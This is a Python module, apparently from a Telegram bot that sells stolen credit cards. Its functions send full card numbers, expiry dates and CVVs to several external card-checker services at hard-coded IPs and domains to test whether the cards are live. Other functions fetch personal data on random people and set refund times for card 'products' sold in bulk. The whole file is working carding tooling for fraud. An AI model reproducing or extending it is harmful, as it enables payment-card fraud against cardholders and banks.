import json
import random
import re
from typing import Union, Optional

import httpcore
import httpx
from async_lru import alru_cache
from bs4 import BeautifulSoup
from bs4.element import ResultSet
from functools import partial

from database import Card

timeout = httpx.Timeout(40, pool=None)

hc = httpx.AsyncClient(http2=True, timeout=timeout)


def tryint(value):
    try:
        return int(value)
    except ValueError:
        return value


async def query_edit(
    self, text: str, reply_markup=None, answer_kwargs={}, *args, **kwargs
):
    edit = await self.edit_message_text(
        text=text, reply_markup=reply_markup, *args, **kwargs
    )
    try:
        await self.answer(**answer_kwargs)
    except:
        pass
    return edit


def message_remove_keyboard(self, message_id=None, *args, **kwargs):
    return self._client.edit_message_reply_markup(
        self.chat.id, message_id or self.message_id, {}, *args, **kwargs
    )


def message_reply(self, text: str, reply_markup=None, *args, **kwargs):
    return self.reply_text(text, *args, reply_markup=reply_markup, *args, **kwargs)


def get_column_value(tags: ResultSet, column_name: str) -> str:
    for tag in tags:
        key, value = tag.select("td")
        if key.text.strip() == column_name:
            val = value.text.strip()
            return "INDEFINIDO" if not val.strip("-") or not val else val
    raise KeyError(f"Could not find the column '{column_name}'.")


@alru_cache(maxsize=1024, cache_exceptions=False)
async def search_bin(card_bin: Union[str, int]) -> Optional[dict]:
    r = await hc.get(
        f"https://dcempreendedorismo.com.br/bin/bin.php?bin={card_bin}",
    )

    rj = r.json()
    print(rj)
    info = {
        "card_bin": bin,
        "country": rj["Pais"],
        "vendor": rj["Bandeira"],
        "card_type": rj["Tipo"],
        "level": rj["Nivel"],
        "bank": rj["Banco"],
    }
    return info


# TODO: Completely remove this function
def strip_float(number):
    decimals = number % 1
    return int(number) if decimals == 0.0 else round(float(number), 2)


async def atem_check_full(card_str: Union[Card, str]):
    gate = "W4rLock"

    if not isinstance(card_str, str):
        card_str = "|".join(
            [
                str(card_str.number),
                card_str.date.replace("/", "|"),
                str(card_str.cvv).zfill(3),
            ]
        )

    print(f"[GATE_{gate}][{card_str}] Checking cc...")


    try:
        r = await hc.get(
            f"http://45.178.180.189:8080/checker/test?token=SEUTOKEN&cc={card_str}",
        )
        rjson = r.json()

    except Exception as err:
        print(err)
        return await ruby_check_full(card_str)


    attempts = 0

    while type(rjson) != dict and attempts <= 10:
        try:
            r = await hc.get(
                f"http://45.178.180.189:8081/checker/test?token=SEUTOKEN&cc={card_str}",
            )
            rjson = r.json()
        except:
            ...
        attempts += 1
        if type(rjson) == dict:
            attempts = 0
            
        elif attempts == 10:
            return (False, card_str, gate)



    print(f"[GATE_{gate}][{card_str}] {rjson}")




    rcode = True if rjson.get('status') == 1 else False

    return (
        rcode,
        card_str,
        gate,
    )


async def cielo_check_full(card_str: Union[Card, str]):
    apikey = "SEUTOKEN"

    gate = "CIELO"

    approved_messages = [
        "Transação autorizada com sucesso.",
        "Transação aprovada com sucesso.",
    ]
    declined_messages = ["Transação não autorizada."]

    if not isinstance(card_str, str):
        card_str = "|".join(
            [
                str(card_str.number),
                card_str.date.replace("/", "|"),
                str(card_str.cvv).zfill(3),
            ]
        )

    print(f"[GATE_{gate}][{card_str}] Checking cc...")

    data = re.search(
        r"(?P<number>\d{16})\W+(?P<month>\d{1,2})\W+(?P<year>\d{2,4})\W+(?P<cvv>\d+)",
        card_str,
    )

    year = "20" + data["year"] if len(data["year"]) == 2 else data["year"]

    try:
        r = await hc.get(
            "http://192.99.119.189:8000/pagamento_api/index.php",
            params={
                "cartao": data["number"],
                "mes": data["month"],
                "ano": year,
                "cvv": data["cvv"],
                "api-key": apikey,
                "gate": "Cielo",
            },
        )
        rjson = r.json()
    except (httpx.ReadTimeout, httpcore.ReadTimeout, json.decoder.JSONDecodeError):
        return await dbf_check_full(card_str)

    print(f"[GATE_{gate}][{card_str}] {rjson}")

    gmsg = rjson.get("MessageGateway")

    rcode = (
        True
        if gmsg in approved_messages
        else False
        if gmsg in declined_messages
        else None
    )

    if rcode is None:
        return await dbf_check_full(card_str)
    return (
        rcode,
        card_str,
        gate,
    )


async def dbf_check_full(card_str: Union[Card, str]):
    username = "SEUUSERNAME"
    password = "SEUTOKEN"

    gate = "DBF"

    if not isinstance(card_str, str):
        card_str = "|".join(
            [
                str(card_str.number),
                card_str.date.replace("/", "|"),
                str(card_str.cvv).zfill(3),
            ]
        )

    print(f"[GATE_{gate}][{card_str}] Checking cc...")

    data = re.search(
        r"(?P<number>\d{16})\W+(?P<month>\d{1,2})\W+(?P<year>\d{2,4})\W+(?P<cvv>\d+)",
        card_str,
    )

    try:
        r = await hc.post(
            "https://dbfcheckers.info/api/testadores/ap1",
            params=dict(usuario=username, senha=password),
            data=dict(
                numero=data["number"],
                mes=data["month"],
                ano=data["year"],
                csc=data["cvv"],
            ),
        )
        rjson = r.json()
    except (httpx.ReadTimeout, httpcore.ReadTimeout, json.decoder.JSONDecodeError):
        return await ruby_check_full(card_str)

    print(f"[GATE_{gate}][{card_str}] {rjson}")

    if not rjson.get("testado"):
        return await ruby_check_full(card_str)
    return rjson.get("aprovado"), card_str, gate


async def get_random_person():
    url = "http://dkstorebot55.xyz/FLASH2077/dados.php"

    try:
        r = await hc.get(url)
        rjson = r.json()
    except:  # TODO: Get all possible exceptions that can be raised from this.
        rjson = {}

    return rjson


async def ruby_check_full(card: Union[Card, str], return_raw=False, check_times=1):
    key = "SEUTOKEN"
    if not isinstance(card, str):
        card = "|".join(
            [
                str(card.number),
                card.date.replace("/", "|"),
                str(card.cvv).zfill(3),
            ]
        )

    gates = ["01", "02", "03", "04", "05"]
    checked_gates = []
    random.shuffle(gates)
    checked_times = 0
    for gate in gates:
        tries = 0
        print(f"[RUBY.{gate}][{card}] Checking cc...")
        while True:
            html_data = None
            try:
                r = await hc.get(
                    f"https://rubychk.azurewebsites.net/Ruby/Gateways_Full/Gate_{gate}/api.php",
                    params=dict(lista=card, key=key, savelog=False),
                )
                html_data = r.text
            except httpx.ReadTimeout:
                break  # tenta a próxima gate
            if not html_data or r.status_code != 200:
                break  # tenta a próxima gate
            try:
                values = json.loads(html_data)
                print(f"[RUBY.{gate}][{card}] {values}")
            except:
                values = {}
            else:
                if (
                    values and values["status"] == 2
                ):  # Retestando, manda o continue para o while executar mais uma vez.
                    # Se ter mais de 3 retestes, pula para o próximo gate.
                    tries += 1
                    if tries >= 3:
                        break
                    continue
            if return_raw:
                return html_data, card, gate
            if "APPROVED" in html_data or (
                values and values["status"] == 0
            ):  # Aprovada.
                return True, card, gate
            if (
                "DECLINED" in html_data
                or (values and values["status"] == 1)
                or "Cartão vencido!" in html_data
            ):  # Reprovada.
                checked_times += 1
                checked_gates.append(gate)
                if checked_times >= check_times or "Cartão vencido!" in html_data:
                    return (
                        False,
                        card,
                        checked_gates[0] if check_times == 1 else checked_gates,
                    )
                else:
                    break
            if values and values["status"] == 3:  # Inválido.
                break  # Pula para o próximo gate. Inválido normalmente é falso-positivo.
            return None, card, gate  # Resultado desconhecido.
    return None, card, gate  # Todas as gates estão off.


def get_time_for_exchange(product):  # in minutes
    # category and subcategory
    category, subcategory = product.upper().split(" ", 1)
    subcategory = tryint(subcategory)

    if category == "UNIT":
        return 10
    elif category == "BIN":
        quantity = subcategory.split(" ")[1]
        quantity = int(quantity.strip("xX"))
    elif category == "MIX":
        quantity = subcategory
    else:
        quantity = 1

    # Return time for exchange based on quantity
    if quantity >= 1000:
        return 1440 * 7  # 7d
    if quantity >= 500:
        return 1440 * 5  # 5d
    if quantity >= 200:
        return 1440 * 4  # 4d
    if quantity >= 100:
        return 1440 * 3  # 3d
    if quantity >= 50:
        return 1440 * 2  # 2d
    if quantity >= 10:
        return 120  # 2h
    if quantity >= 5:
        return 50
    if quantity >= 3:
        return 25
    if quantity >= 1:
        return 10

    return 10


# Based on https://gist.github.com/thatalextaylor/7408395
def pretty_time_delta(time_int, as_minutes=True):
    if as_minutes:
        time_int = int(time_int) * 60
    else:
        time_int = int(time_int)
    days, time_int = divmod(time_int, 86400)
    hours, time_int = divmod(time_int, 3600)
    minutes, time_int = divmod(time_int, 60)
    if days > 0:
        return "%d dia%s, %d hora%s e %d minuto%s" % (
            days,
            "" if days == 1 else "s",
            hours,
            "" if hours == 1 else "s",
            minutes,
            "" if minutes == 1 else "s",
        )
    elif hours > 0:
        return "%d hora%s e %d minuto%s" % (
            hours,
            "" if hours == 1 else "s",
            minutes,
            "" if minutes == 1 else "s",
        )
    elif minutes > 0:
        return "%d minuto%s" % (
            minutes,
            "" if minutes == 1 else "s",
        )
    else:
        return "%d segundo%s" % (
            time_int,
            "" if time_int == 1 else "s",
        )
